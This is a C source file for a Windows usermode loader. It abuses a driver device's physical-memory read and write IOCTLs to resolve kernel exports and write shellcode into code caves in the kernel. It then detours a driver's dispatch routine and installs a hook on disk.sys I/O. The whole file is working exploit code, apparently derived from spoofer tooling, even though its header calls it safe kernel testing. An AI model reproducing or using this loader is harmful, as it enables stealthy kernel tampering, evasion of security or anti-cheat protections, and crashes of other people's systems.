// fb_diskhook.c — complete patched loader for safe kernel testing
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

static FILE *g_fl = NULL;
static void flog(const char *fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (!g_fl) g_fl = fopen("C:\\hook_log.txt", "wc"); // "c" = commit to disk on fflush (survives hard reset)
    if (g_fl) { fprintf(g_fl, "%s\n", buf); fflush(g_fl); }
    fputs(buf, stdout); fputs("\n", stdout); fflush(stdout);
}

#define DEVICE_NAME    L"\\\\.\\facebook-media"
#define IOCTL_READ_VA  0x222000
#define IOCTL_READ_PA  0x222018
#define IOCTL_WRITE_PA 0x22201C

static HANDLE g_dev;
static DWORD64 g_dirbase, g_kbase;

static int virt_read(DWORD64 va, void *o, DWORD64 s, DWORD64 db) {
    BYTE r[0x28] = {0};
    *(DWORD64*)(r + 8)    = va;
    *(DWORD64*)(r + 0x10) = (DWORD64)o;
    *(DWORD64*)(r + 0x18) = s;
    *(DWORD64*)(r + 0x20) = db;
    DWORD b = 0;
    return DeviceIoControl(g_dev, IOCTL_READ_VA, r, sizeof(r), NULL, 0, &b, NULL);
}

static int phys_read(DWORD64 pa, void *o, DWORD64 s) {
    BYTE r[0x20] = {0};
    *(DWORD64*)(r + 8)    = pa;
    *(DWORD64*)(r + 0x10) = (DWORD64)o;
    *(DWORD64*)(r + 0x18) = s;
    DWORD b = 0;
    return DeviceIoControl(g_dev, IOCTL_READ_PA, r, sizeof(r), NULL, 0, &b, NULL);
}

static int phys_write(DWORD64 pa, const void *i, DWORD64 s) {
    BYTE r[0x20] = {0};
    *(DWORD64*)(r + 8)    = pa;
    *(DWORD64*)(r + 0x10) = (DWORD64)i;
    *(DWORD64*)(r + 0x18) = s;
    DWORD b = 0;
    return DeviceIoControl(g_dev, IOCTL_WRITE_PA, r, sizeof(r), NULL, 0, &b, NULL);
}

static DWORD64 get_kernel_base(void) {
    typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t q = (NtQSI_t)(void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    ULONG s = 0; q(11, NULL, 0, &s); s += 0x1000;
    BYTE *b = (BYTE*)malloc(s); memset(b, 0, s);
    if (q(11, b, s, &s) != 0) { free(b); return 0; }
    DWORD64 base = *(DWORD64*)(b + 8 + 0x10);
    free(b);
    return base;
}

static DWORD64 get_module(const char *name, DWORD64 *size) {
    typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t q = (NtQSI_t)(void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    ULONG need = 0; q(11, NULL, 0, &need);
    char *b = (char*)malloc(need);
    if (q(11, b, need, &need) != 0) { free(b); return 0; }
    ULONG cnt = *(ULONG*)b;
    struct { HANDLE s; void *mb; void *ib; ULONG sz; ULONG fl; USHORT li, io, lc; USHORT ofn; UCHAR fn[256]; } *m = (void*)(b + 8);
    for (ULONG i = 0; i < cnt; i++) {
        if (strstr((char*)m[i].fn, name)) {
            DWORD64 base = (DWORD64)m[i].ib;
            if (size) *size = m[i].sz;
            free(b);
            return base;
        }
    }
    free(b);
    return 0;
}

static void find_containing_module(DWORD64 va, char *out, DWORD64 *obase, DWORD64 *osize) {
    typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t q = (NtQSI_t)(void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    ULONG need = 0; q(11, NULL, 0, &need);
    char *b = (char*)malloc(need);
    if (q(11, b, need, &need) != 0) { free(b); return; }
    ULONG cnt = *(ULONG*)b;
    struct { HANDLE s; void *mb; void *ib; ULONG sz; ULONG fl; USHORT li, io, lc; USHORT ofn; UCHAR fn[256]; } *m = (void*)(b + 8);
    for (ULONG i = 0; i < cnt; i++) {
        DWORD64 base = (DWORD64)m[i].ib;
        ULONG sz = m[i].sz;
        if (va >= base && va < base + sz) {
            strncpy(out, (char*)m[i].fn, 255); out[255] = 0;
            *obase = base; *osize = sz;
            free(b);
            return;
        }
    }
    out[0] = 0; *obase = 0; *osize = 0;
    free(b);
}

static DWORD64 find_dirbase(void) {
    // Proven CR3 finder (from the UC temp-spoofer source): scan physical memory for a page
    // whose first 4 bytes are E9 4D 06 00, then read the DirectoryTableBase (CR3) from offset
    // 0xA0 of that page. Reliable every boot — no hardcoded guess.
    BYTE hdr[0xA8];
    for (DWORD64 pa = 0; pa < 0x20000000; pa += 0x1000) {
        if (!phys_read(pa, hdr, 0xA8)) continue;
        if (hdr[0] == 0xE9 && hdr[1] == 0x4D && hdr[2] == 0x06 && hdr[3] == 0x00) {
            DWORD64 dtb = *(DWORD64*)(hdr + 0xA0);
            if (dtb && (dtb & 0xFFF) == 0) {
                flog("found system cr3: 0x%llX", dtb);
                return dtb;
            }
        }
    }
    return 0;
}

static DWORD64 va_to_pa(DWORD64 va) {
    DWORD64 i4 = (va >> 39) & 0x1FF, i3 = (va >> 30) & 0x1FF, i2 = (va >> 21) & 0x1FF, i1 = (va >> 12) & 0x1FF;
    DWORD64 pml4e = 0, pdpe = 0, pde = 0, pte = 0;
    if (!phys_read((g_dirbase & ~0xFFFULL) + i4 * 8, &pml4e, 8) || !(pml4e & 1)) return 0;
    if (!phys_read((pml4e & 0x000FFFFFFFFFF000ULL) + i3 * 8, &pdpe, 8) || !(pdpe & 1)) return 0;
    if (pdpe & 0x80) return (pdpe & 0x000FFFFFC0000000ULL) + (va & 0x3FFFFFFFULL);
    if (!phys_read((pdpe & 0x000FFFFFFFFFF000ULL) + i2 * 8, &pde, 8) || !(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) + (va & 0x1FFFFFULL);
    if (!phys_read((pde & 0x000FFFFFFFFFF000ULL) + i1 * 8, &pte, 8) || !(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) + (va & 0xFFFULL);
}

// Page-boundary safe write to prevent cross-page physical corruption
static int write_kva(DWORD64 va, const void *data, DWORD64 len) {
    const BYTE *src = (const BYTE*)data;
    DWORD64 off = 0;
    while (off < len) {
        DWORD64 cur_va = va + off;
        DWORD64 page_rem = 0x1000ULL - (cur_va & 0xFFFULL);
        DWORD64 chunk = (len - off < page_rem) ? (len - off) : page_rem;
        DWORD64 pa = va_to_pa(cur_va);
        if (!pa) return 0;
        if (!phys_write(pa, src + off, chunk)) return 0;
        off += chunk;
    }
    return 1;
}

static int is_exec(DWORD64 va) {
    DWORD64 i4 = (va >> 39) & 0x1FF, i3 = (va >> 30) & 0x1FF, i2 = (va >> 21) & 0x1FF, i1 = (va >> 12) & 0x1FF;
    DWORD64 pml4e = 0, pdpe = 0, pde = 0, pte = 0;
    if (!phys_read((g_dirbase & ~0xFFFULL) + i4 * 8, &pml4e, 8) || !(pml4e & 1)) return 0;
    if (!phys_read((pml4e & 0x000FFFFFFFFFF000ULL) + i3 * 8, &pdpe, 8) || !(pdpe & 1)) return 0;
    if (pdpe & 0x80) return !(pdpe & (1ULL << 63));
    if (!phys_read((pdpe & 0x000FFFFFFFFFF000ULL) + i2 * 8, &pde, 8) || !(pde & 1)) return 0;
    if (pde & 0x80) return !(pde & (1ULL << 63));
    if (!phys_read((pde & 0x000FFFFFFFFFF000ULL) + i1 * 8, &pte, 8) || !(pte & 1)) return 0;
    return !(pte & (1ULL << 63));
}

static DWORD64 find_export(DWORD64 base, const char *name) {
    DWORD32 e_lfanew = 0; if (!virt_read(base + 0x3C, &e_lfanew, 4, g_dirbase)) return 0;
    DWORD32 export_rva = 0; if (!virt_read(base + e_lfanew + 0x18 + 0x70, &export_rva, 4, g_dirbase)) return 0;
    if (!export_rva) return 0;
    DWORD64 exp = base + export_rva;
    DWORD32 nf = 0, nn = 0, af = 0, an = 0, ao = 0;
    if (!virt_read(exp + 0x14, &nf, 4, g_dirbase)) return 0;   // NumberOfFunctions
    if (!virt_read(exp + 0x18, &nn, 4, g_dirbase)) return 0;   // NumberOfNames
    if (!virt_read(exp + 0x1C, &af, 4, g_dirbase)) return 0;   // AddressOfFunctions
    if (!virt_read(exp + 0x20, &an, 4, g_dirbase)) return 0;   // AddressOfNames
    if (!virt_read(exp + 0x24, &ao, 4, g_dirbase)) return 0;   // AddressOfNameOrdinals
    for (DWORD32 i = 0; i < nn; i++) {
        DWORD32 name_rva = 0; if (!virt_read(base + an + i * 4, &name_rva, 4, g_dirbase)) continue;
        char nb[64] = {0}; if (!virt_read(base + name_rva, nb, sizeof(nb) - 1, g_dirbase)) continue;
        if (strcmp(nb, name) == 0) {
            // NameOrdinals[i] is already an UNBIASED (zero-based) index into the EAT
            // (PE spec: "rva = ExportAddressTable[ordinal]"). Do NOT subtract OrdinalBase.
            unsigned short ord = 0; if (!virt_read(base + ao + i * 2, &ord, 2, g_dirbase)) return 0;
            if (ord >= nf) return 0;   // bounds check
            DWORD32 fr = 0; if (!virt_read(base + af + (DWORD32)ord * 4, &fr, 4, g_dirbase)) return 0;
            return base + fr;
        }
    }
    return 0;
}

// Restricts cave search to non-pageable .text section
static DWORD64 find_cave(DWORD64 mod, DWORD64 need) {
    unsigned char dos[0x40] = {0}; virt_read(mod, dos, 0x40, g_dirbase);
    ULONG e = *(ULONG*)(dos + 0x3C);
    unsigned char pe[0x800] = {0}; virt_read(mod + e, pe, 0x800, g_dirbase);
    USHORT nsec = *(USHORT*)(pe + 6);
    ULONG so = 0x18 + *(USHORT*)(pe + 0x14);
    unsigned char *chunk = (unsigned char*)malloc(0x1000);
    static const unsigned char pads[3] = {0xCC, 0x90, 0x00};

    for (int pi = 0; pi < 3; pi++) {
        unsigned char pad = pads[pi];
        for (int i = 0; i < nsec; i++) {
            unsigned char *sh = pe + so + i * 40;
            char sec_name[9] = {0}; memcpy(sec_name, sh, 8);
            ULONG *s = (ULONG*)sh;
            if (!(s[9] & 0x20000000)) continue;
            if (s[9] & 0x02000000) continue;
            if (!(s[9] & 0x08000000)) continue;   // non-paged only — pageable sections hang MmCopyMemory

            DWORD64 va = mod + s[3];
            ULONG sz = s[2] > s[4] ? s[2] : s[4];

            for (ULONG off = 0; off < sz; off += 0x1000) {
                DWORD64 page_va = va + off;
                if (!va_to_pa(page_va) || !is_exec(page_va)) continue;
                if (!virt_read(page_va, chunk, 0x1000, g_dirbase)) continue;

                ULONG run = 0;
                for (ULONG j = 0; j < 0x1000; j++) {
                    if (chunk[j] == pad) {
                        if (++run >= need + 16) {
                            DWORD64 r = (page_va + j - run + 1 + 8 + 0xFULL) & ~0xFULL;
                            if ((r & ~0xFFFULL) == (page_va & ~0xFFFULL) &&
                                ((r + need - 1) & ~0xFFFULL) == (page_va & ~0xFFFULL)) {
                                free(chunk);
                                return r;
                            }
                        }
                    } else { run = 0; }
                }
            }
        }
    }
    free(chunk);
    return 0;
}

static int patch_slot(unsigned char *blob, DWORD len, const unsigned char pat[8], DWORD64 val) {
    for (DWORD i = 0; i + 8 <= len; i++) {
        if (memcmp(blob + i, pat, 8) == 0) {
            memcpy(blob + i, &val, 8);
            return 1;
        }
    }
    return 0;
}

// Fixed prologue scan math to avoid off-by-16 misalignments
static DWORD64 find_dispatch_by_scan(DWORD64 cbase, DWORD64 csize) {
    unsigned char *buf = (unsigned char*)malloc(csize);
    if (!virt_read(cbase, buf, csize, g_dirbase)) { free(buf); return 0; }
    DWORD64 ref = 0;
    for (DWORD64 i = 0; i + 4 <= csize; i++) {
        if (*(DWORD32*)(buf + i) == 0x00222000) { ref = cbase + i; break; }
    }
    if (!ref) { free(buf); return 0; }
    DWORD64 off = ref - cbase;
    long j = (long)off - 2;
    DWORD64 entry = 0;
    while (j >= 16) {
        if ((j & 0xF) == 0 && buf[j - 1] == 0xCC && buf[j - 2] == 0xCC && buf[j] != 0xCC) {
            entry = cbase + (DWORD64)j;
            break;
        }
        j--;
    }
    free(buf);
    return entry;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    flog("=== fb_diskhook start ===");
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) { flog("open failed"); return 1; }
    g_kbase = get_kernel_base(); g_dirbase = find_dirbase();
    flog("kbase=0x%llX dirbase=0x%llX", g_kbase, g_dirbase);
    if (!g_kbase || !g_dirbase) return 1;

    DWORD64 ob_ref = find_export(g_kbase, "ObReferenceObjectByName");
    DWORD64 ob_deref = find_export(g_kbase, "ObDereferenceObject");
    DWORD64 iocpl  = find_export(g_kbase, "IoCompleteRequest");
    DWORD64 iodt   = find_export(g_kbase, "IoDriverObjectType");
    // IoDriverObjectType is a data export: find_export returns the ADDRESS of the variable.
    // ObReferenceObjectByName wants the VALUE (the POBJECT_TYPE pointer), so dereference it.
    DWORD64 iodt_val = 0;
    virt_read(iodt, &iodt_val, 8, g_dirbase);
    flog("ob_ref=0x%llX ob_deref=0x%llX iocpl=0x%llX iodt=0x%llX value=0x%llX", ob_ref, ob_deref, iocpl, iodt, iodt_val);
    if (!ob_ref || !ob_deref || !iocpl || !iodt_val) { flog("export resolution failed"); return 1; }
    DWORD64 tbuf = 0; if (iodt_val) virt_read(iodt_val + 0x18, &tbuf, 8, g_dirbase);
    wchar_t tname[32] = {0}; if (tbuf) virt_read(tbuf, tname, 60, g_dirbase);
    flog("object type name = %ls", tname);
    DWORD64 csz = 0; DWORD64 cbase = get_module("chinese.sys", &csz);
    flog("chinese.sys base=0x%llX size=0x%llX", cbase, csz);
    DWORD64 fb_orig_dispatch = find_dispatch_by_scan(cbase, csz);
    flog("dispatch=0x%llX", fb_orig_dispatch);
    if (!fb_orig_dispatch) return 1;

    unsigned char hook[0x200] = {0}, inst[0x200] = {0};
    DWORD hlen = 0, ilen = 0;
    HANDLE bf = CreateFileW(L"C:\\Users\\drvdev\\Downloads\\hook.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (bf == INVALID_HANDLE_VALUE) { flog("hook.bin missing"); return 1; }
    DWORD rd = 0; ReadFile(bf, hook, sizeof(hook), &rd, NULL); CloseHandle(bf); hlen = rd;
    bf = CreateFileW(L"C:\\Users\\drvdev\\Downloads\\installer.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (bf == INVALID_HANDLE_VALUE) { flog("installer.bin missing"); return 1; }
    rd = 0; ReadFile(bf, inst, sizeof(inst), &rd, NULL); CloseHandle(bf); ilen = rd;
    flog("hook.bin=%lu installer.bin=%lu", hlen, ilen);

    DWORD64 hook_cave = find_cave(g_kbase, hlen);
    flog("hook cave @ 0x%llX", hook_cave);
    if (!hook_cave) return 1;

    static const unsigned char p1[8] = {0x01,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
    static const unsigned char p2[8] = {0x02,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
    static const unsigned char p3[8] = {0x03,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
    static const unsigned char p4[8] = {0x04,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
    static const unsigned char p5[8] = {0x05,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
    if (!patch_slot(inst, ilen, p1, ob_ref))   { flog("patch p1 (ObReferenceObjectByName) FAILED"); return 1; }
    if (!patch_slot(inst, ilen, p2, iocpl))    { flog("patch p2 (IoCompleteRequest) FAILED"); return 1; }
    if (!patch_slot(inst, ilen, p3, hook_cave)){ flog("patch p3 (hook cave) FAILED"); return 1; }
    if (!patch_slot(inst, ilen, p4, iodt_val)) { flog("patch p4 (IoDriverObjectType) FAILED"); return 1; }
    if (!patch_slot(inst, ilen, p5, ob_deref)) { flog("patch p5 (ObDereferenceObject) FAILED"); return 1; }
    flog("placeholders patched");

    write_kva(hook_cave, hook, hlen);
    flog("hook written");

    DWORD64 inst_cave = find_cave(g_kbase, ilen);
    flog("installer cave @ 0x%llX", inst_cave);
    if (!inst_cave) return 1;
    write_kva(inst_cave, inst, ilen);
    flog("stubs written");

    // readback verify: do the stubs actually sit at the caves (or did the write miss)?
    unsigned char rb[16] = {0};
    virt_read(hook_cave, rb, 16, g_dirbase);
    flog("hook readback: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
         rb[0],rb[1],rb[2],rb[3],rb[4],rb[5],rb[6],rb[7],rb[8],rb[9],rb[10],rb[11],rb[12],rb[13],rb[14],rb[15]);
    flog("hook expect : %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
         hook[0],hook[1],hook[2],hook[3],hook[4],hook[5],hook[6],hook[7],hook[8],hook[9],hook[10],hook[11],hook[12],hook[13],hook[14],hook[15]);
    virt_read(inst_cave, rb, 16, g_dirbase);
    flog("inst  readback: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
         rb[0],rb[1],rb[2],rb[3],rb[4],rb[5],rb[6],rb[7],rb[8],rb[9],rb[10],rb[11],rb[12],rb[13],rb[14],rb[15]);
    flog("inst  expect : %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
         inst[0],inst[1],inst[2],inst[3],inst[4],inst[5],inst[6],inst[7],inst[8],inst[9],inst[10],inst[11],inst[12],inst[13],inst[14],inst[15]);

    unsigned char orig_bytes[16] = {0};
    virt_read(fb_orig_dispatch, orig_bytes, 16, g_dirbase);
    unsigned char jmp[16] = {0}; int j = 0;
    jmp[j++] = 0x48; jmp[j++] = 0xB8; memcpy(jmp + j, &inst_cave, 8); j += 8;
    jmp[j++] = 0xFF; jmp[j++] = 0xE0;
    write_kva(fb_orig_dispatch, jmp, 12);
    flog("detoured, triggering");

    BYTE dummy[0x28] = {0}, outbuf[0x20] = {0}; DWORD br = 0;
    BOOL trig_ok = DeviceIoControl(g_dev, IOCTL_READ_VA, dummy, sizeof(dummy), outbuf, sizeof(outbuf), &br, NULL);
    flog("trigger %s bytes=%lu", trig_ok ? "OK" : "FAILED", br);
    if (!trig_ok || br < 8) {
        // installer stub never ran (or failed before writing the buffer). The
        // detour is already in place — restore chinese.sys's original dispatch
        // NOW, otherwise every facebook-media IOCTL jumps into a half-written
        // cave. Then abort instead of patching the hook with garbage.
        write_kva(fb_orig_dispatch, orig_bytes, 12);
        flog("trigger failed -> detour restored, ABORT (no BSOD this run)");
        return 1;
    }
    DWORD64 orig_dispatch = *(DWORD64*)outbuf;
    flog("orig dispatch = 0x%llX", orig_dispatch);
    // CRITICAL: only accept a canonical kernel VA that is actually EXECUTABLE.
    // Last run the installer bailed early (ObReferenceObjectByName returned
    // STATUS_ACCESS_DENIED because DesiredAccess was 0), SystemBuffer stayed
    // zeroed, and the injector happily patched the hook with 0x0 as the
    // "original dispatch" -> jmp to non-executable page -> ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY -> BSOD.
    int valid = (orig_dispatch != 0 && orig_dispatch != 0x1122334455667788ULL &&
                 (orig_dispatch >> 40) == 0xFFFFFULL && is_exec(orig_dispatch));
    if (!valid) {
        flog("orig dispatch INVALID (exec=%s) -> restoring detour, NOT patching hook", is_exec(orig_dispatch) ? "YES" : "NO");
        write_kva(fb_orig_dispatch, orig_bytes, 12);
        return 1;
    }
    BYTE ob[16] = {0};
    virt_read(orig_dispatch, ob, 16, g_dirbase);
    flog("orig bytes: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
         ob[0],ob[1],ob[2],ob[3],ob[4],ob[5],ob[6],ob[7],ob[8],ob[9],ob[10],ob[11],ob[12],ob[13],ob[14],ob[15]);
    flog("orig exec: %s", is_exec(orig_dispatch) ? "YES" : "NO");
    DWORD64 drobj = *(DWORD64*)(outbuf + 8);
    wchar_t dn4[5] = {0}; memcpy(dn4, outbuf + 24, 8);
    flog("drobj = 0x%llX  Type+Size = 0x%llX  DriverName = %ls", drobj, *(DWORD64*)(outbuf + 16), dn4);
    if (drobj) {
        DWORD64 dnbuf = 0; virt_read(drobj + 0x40, &dnbuf, 8, g_dirbase);
        wchar_t dn[64] = {0}; if (dnbuf) virt_read(dnbuf, dn, 120, g_dirbase);
        flog("driver name = %ls", dn);
        // dump the MajorFunction table region to find where MF14 really is
        DWORD64 mf[4] = {0};
        for (int k = 0; k < 4; k++) virt_read(drobj + 0x70 + k * 8, &mf[k], 8, g_dirbase);
        flog("MajorFunction[0..3] = %llX %llX %llX %llX", mf[0], mf[1], mf[2], mf[3]);
        DWORD64 mf14 = 0; virt_read(drobj + 0xE0, &mf14, 8, g_dirbase);
        flog("MajorFunction[14] = 0x%llX  exec=%s", mf14, is_exec(mf14) ? "YES" : "NO");
        // The installer stub took a reference on the driver object and now
        // always dereferences it itself — nothing to clean up here.
    }
    DWORD64 dsz = 0; DWORD64 dbase = get_module("disk.sys", &dsz);
    flog("disk.sys base=0x%llX size=0x%llX", dbase, dsz);
    flog("orig in disk.sys: %s", (dbase && orig_dispatch >= dbase && orig_dispatch < dbase + dsz) ? "YES" : "NO");
    char mname[256] = {0}; DWORD64 mbase = 0, msize = 0;
    find_containing_module(orig_dispatch, mname, &mbase, &msize);
    flog("orig dispatch in module: 0x%llX-0x%llX (%s)", mbase, mbase + msize, mname[0] ? mname : "NONE");
    if (mbase) flog("orig dispatch offset in module: +0x%llX", orig_dispatch - mbase);
    // patch the hook's imm64 placeholder with the original disk.sys dispatch (usermode
    // phys_write, no CR0.WP). the hook now calls the real handler on the next disk I/O.
    // orig_dispatch was already validated (canonical kernel VA + executable) above.
    if (phys_write(va_to_pa(hook_cave + 0x02), &orig_dispatch, 8))
        flog("hook placeholder patched");
    else {
        flog("hook placeholder patch FAILED -> restoring detour, NOT leaving unpatched hook installed");
        write_kva(fb_orig_dispatch, orig_bytes, 12);
        return 1;
    }

    write_kva(fb_orig_dispatch, orig_bytes, 12);
    flog("done.");
    return 0;
}
